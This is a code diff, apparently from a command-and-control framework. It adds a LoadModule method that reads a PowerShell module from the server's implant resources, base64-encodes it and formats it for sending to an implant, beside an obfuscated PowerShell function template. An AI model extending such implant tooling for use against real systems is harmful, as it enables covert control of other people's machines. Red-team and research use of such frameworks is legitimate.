@@ -1,3 +1,7 @@
+import os
+import base64
+
+
 class LoadModule:
     type = "LM"
     args = "name of powershell module on server"
@@ -25,3 +29,20 @@ function {{ ron.obf_load_module }} ($data) {
         #    Does the file to be uploaded exist local?
         #    Is the command to be executed dangerous?
         return True
+
+
+    def create_module_data_string(self, cmd_entry):
+        # This function is responsible for creating the string which is send to the implant
+        # Format for the implant core string is:
+        #   < command type > <command id><optional command arguments>
+        try:
+            with open(str(os.getcwd() + "/Storage/implant_resources/modules/" + cmd_entry['args'] + ".ps1"),
+                      'r') as fileh:
+                to_encode = f"{cmd_entry['args']}::{fileh.read()}"
+                load_module_string = f"{base64.b64encode(to_encode.encode()).decode()}"
+                return load_module_string
+        except Exception as e:
+
+            # These exceptions should be added to a log file.
+            print(f"Load module failed: {e}")
+            pass
